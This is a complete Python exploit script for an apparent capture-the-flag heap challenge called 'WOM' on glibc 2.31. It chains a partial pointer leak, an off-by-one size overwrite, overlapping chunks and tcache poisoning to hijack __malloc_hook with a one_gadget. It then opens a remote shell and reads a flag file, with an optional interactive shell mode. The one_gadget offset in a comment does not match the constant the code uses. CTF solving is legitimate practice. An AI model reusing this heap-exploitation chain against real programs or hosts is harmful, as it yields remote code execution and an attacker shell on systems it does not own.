#!/usr/bin/env python3
"""
WOM exploit — deterministic, single-shot, stdlib-only.

Replaces the brute-force libc-base approach from test.py. We only have a 12-bit
leak (printf >> 12 & 0xfff), so instead of writing full 64-bit pointers we use
partial overwrites that stay within the 12 leaked bits:
  - 1-byte LSB rewrite on a main_arena fd pointer -> pivot to __malloc_hook
  - 3-byte overwrite using the leak -> turn a smuggled libc pointer into one_gadget

Usage:
  python3 test_fixed.py                                        # remote (defaults to HiveCTF host)
  python3 test_fixed.py --local --bin ./wom/challenge/wom.bin  # local test
  python3 test_fixed.py --shell-cmd "cat /app/flag.txt"        # custom post-RCE command
"""
import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path


MENU = b"Choice: "
FLAG_RE = re.compile(rb"[A-Za-z0-9_]+\{[^}\n]+\}")

# libc-2.31 (shipped with challenge, md5 db998b46d6c79cbba3ca09f4692cebb5)
# one_gadget: 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints: [r15]==NULL || r15==NULL, [rdx]==NULL || rdx==NULL
# wom.c sets rdx=size (we pass 0) and never touches r15 (so it's NULL).
ONE_GADGET_OFF = 0x82B01


# -----------------------------------------------------------------------------
# stdlib I/O tubes (no pwntools)
# -----------------------------------------------------------------------------
class TubeIO:
    def __init__(self):
        self._buffer = bytearray()

    def _send(self, data): raise NotImplementedError
    def _read_chunk(self, timeout): raise NotImplementedError
    def close(self): raise NotImplementedError

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        self._send(data)

    def sendline(self, data):
        if isinstance(data, str):
            data = data.encode()
        self._send(data + b"\n")

    def recvuntil(self, needle, timeout=5.0):
        if isinstance(needle, str):
            needle = needle.encode()
        deadline = time.monotonic() + timeout
        while True:
            idx = self._buffer.find(needle)
            if idx != -1:
                end = idx + len(needle)
                out = bytes(self._buffer[:end])
                del self._buffer[:end]
                return out
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(f"timeout waiting for {needle!r}; buffer={bytes(self._buffer)!r}")
            chunk = self._read_chunk(remaining)
            if chunk is None:
                continue
            if chunk == b"":
                raise EOFError(bytes(self._buffer))
            self._buffer.extend(chunk)

    def recvrepeat(self, timeout):
        data = bytes(self._buffer)
        self._buffer.clear()
        deadline = time.monotonic() + timeout
        while True:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                break
            chunk = self._read_chunk(remaining)
            if chunk is None or chunk == b"":
                break
            data += chunk
            deadline = time.monotonic() + timeout
        return data


class LocalIO(TubeIO):
    def __init__(self, argv, cwd, env):
        super().__init__()
        self.proc = subprocess.Popen(
            argv, cwd=cwd, env=env,
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        )

    def _send(self, data):
        self.proc.stdin.write(data)
        self.proc.stdin.flush()

    def _read_chunk(self, timeout):
        ready, _, _ = select.select([self.proc.stdout], [], [], timeout)
        if not ready:
            return None
        data = os.read(self.proc.stdout.fileno(), 4096)
        return data if data else b""

    def close(self):
        if self.proc.poll() is None:
            try:
                self.proc.kill()
            except ProcessLookupError:
                pass
        try:
            self.proc.wait(timeout=1)
        except subprocess.TimeoutExpired:
            pass


class RemoteIO(TubeIO):
    def __init__(self, host, port, timeout=10.0):
        super().__init__()
        self.sock = socket.create_connection((host, port), timeout=timeout)
        self.sock.settimeout(None)

    def _send(self, data):
        self.sock.sendall(data)

    def _read_chunk(self, timeout):
        ready, _, _ = select.select([self.sock], [], [], timeout)
        if not ready:
            return None
        data = self.sock.recv(4096)
        return data if data else b""

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


# -----------------------------------------------------------------------------
# WOM menu wrappers
# -----------------------------------------------------------------------------
def pbytes(value, nbytes):
    return int(value).to_bytes(8, "little")[:nbytes]


def p64(value):
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


def malloc_wom(io, size):
    io.sendline(b"1")
    io.recvuntil(b"Size: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"ID#")
    idx = io.recvuntil(b")").rstrip(b")")
    io.recvuntil(MENU)
    return int(idx, 10)


def edit_wom(io, idx, data):
    io.sendline(b"2")
    io.recvuntil(b"WOM ID: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Content: ")
    io.send(data)
    io.recvuntil(MENU)


def free_wom(io, idx):
    io.sendline(b"3")
    io.recvuntil(b"WOM ID: ")
    io.sendline(str(idx).encode())
    io.recvuntil(MENU)


# -----------------------------------------------------------------------------
# Exploit
# -----------------------------------------------------------------------------
def pop(io):
    io.recvuntil(b"Auditing Compliance Tag: ")
    leak = int(io.recvuntil(b"\n").rstrip(b"\n"), 10)
    io.recvuntil(MENU)

    # Align heap, then plant a libc pointer via unsorted-bin remainder.
    free_wom(io, malloc_wom(io, 0x38))
    U = malloc_wom(io, 0x418)   # too large for tcache -> unsorted bin on free
    _guard = malloc_wom(io, 0x18)
    free_wom(io, U)             # U.fd now holds a main_arena pointer

    _padding = malloc_wom(io, 0x18)
    A = malloc_wom(io, 0x18)    # carved from U's remainder; first 8 bytes = main_arena ptr

    # 1-byte LSB rewrite -> pivot main_arena pointer to __malloc_hook (same page).
    edit_wom(io, A, b"\x70")

    B = malloc_wom(io, 0x18)
    C = malloc_wom(io, 0x18)
    D = malloc_wom(io, 0x18)
    E = malloc_wom(io, 0x18)
    F = malloc_wom(io, 0x18)

    # Off-by-one via read(..., size+1): enlarge C's chunk size to 0x41.
    edit_wom(io, B, bytes(0x18) + b"\x41")
    free_wom(io, C)
    C = malloc_wom(io, 0x38)    # now C overlaps D, E, F

    # Stage tcache and redirect its head to A's rewritten pointer (__malloc_hook).
    free_wom(io, F)
    free_wom(io, E)
    free_wom(io, D)
    edit_wom(io, C, bytes(0x18) + p64(0x21) + b"\x00")

    D = malloc_wom(io, 0x18)
    A = malloc_wom(io, 0x18)
    T = malloc_wom(io, 0x18)    # T is a chunk *at* __malloc_hook (zeroed)

    # Repeat the trick, this time pivoting to __realloc_hook (0x10 earlier).
    edit_wom(io, A, b"\x60")

    E = malloc_wom(io, 0x18)
    F = malloc_wom(io, 0x18)
    free_wom(io, F)
    free_wom(io, E)
    free_wom(io, D)
    edit_wom(io, C, bytes(0x18) + p64(0x21) + b"\x00")

    D = malloc_wom(io, 0x18)
    A = malloc_wom(io, 0x18)
    S = malloc_wom(io, 0x18)    # S sits at __realloc_hook (holds a live libc pointer)

    # Fake a chunk size after S so free(T) passes _int_free sanity checks.
    edit_wom(io, S, b"S" * 8 + p64(0x21))
    free_wom(io, T)
    # Freeing T causes the smuggled libc pointer (originally at __realloc_hook)
    # to be written into __malloc_hook as a tcache fd.

    # 3-byte partial overwrite: turn that libc pointer into the one_gadget.
    edit_wom(io, S, b"S" * 8 + p64(0x21) + pbytes((leak << 12) + ONE_GADGET_OFF, 3))

    # Trigger: malloc(0) -> __malloc_hook -> execve("/bin/sh", NULL, NULL)
    io.sendline(b"1")
    io.recvuntil(b"Size: ")
    io.sendline(b"0")


def grab_flag(io, shell_cmd, timeout):
    io.send(shell_cmd.rstrip(b"\n") + b"\n")
    data = io.recvrepeat(timeout)
    match = FLAG_RE.search(data)
    return (match.group(0).decode() if match else None), data


# -----------------------------------------------------------------------------
# CLI
# -----------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--local", action="store_true", help="spawn the binary locally instead of connecting over TCP")
    parser.add_argument("--host", default="localhost")
    parser.add_argument("--port", type=int, default=7002)
    parser.add_argument("--bin", default="./wom.bin", help="path to wom.bin (local mode)")
    parser.add_argument(
        "--shell-cmd",
        default="cat /app/flag.txt flag.txt /flag 2>/dev/null",
        help="command to run in the popped shell",
    )
    parser.add_argument("--timeout", type=float, default=8.0)
    parser.add_argument("--interactive", action="store_true", help="after popping, drop into an interactive shell")
    args = parser.parse_args()

    if args.local:
        bin_path = Path(args.bin).resolve()
        cwd = bin_path.parent
        env = os.environ.copy()
        env["HOME"] = str(cwd)
        io = LocalIO([str(bin_path)], str(cwd), env)
    else:
        io = RemoteIO(args.host, args.port, timeout=args.timeout)

    try:
        pop(io)

        if args.interactive:
            print("[+] shell ready — type commands (Ctrl+D to exit):", file=sys.stderr)
            io.send(b"echo __READY__\n")
            io.recvuntil(b"__READY__\n", timeout=args.timeout)
            _interactive_loop(io)
            return

        flag, raw = grab_flag(io, args.shell_cmd.encode(), args.timeout)
        if flag:
            print(flag)
        else:
            sys.stderr.write("[-] no flag matched; raw shell output:\n")
            sys.stdout.buffer.write(raw)
            sys.exit(1)
    finally:
        io.close()


def _interactive_loop(io):
    import threading
    stop = threading.Event()

    def reader():
        while not stop.is_set():
            try:
                chunk = io._read_chunk(0.2)
            except Exception:
                break
            if chunk is None:
                continue
            if chunk == b"":
                stop.set()
                break
            sys.stdout.buffer.write(chunk)
            sys.stdout.flush()

    t = threading.Thread(target=reader, daemon=True)
    t.start()
    try:
        for line in sys.stdin:
            io.send(line.encode())
    except (EOFError, KeyboardInterrupt):
        pass
    finally:
        stop.set()


if __name__ == "__main__":
    main()
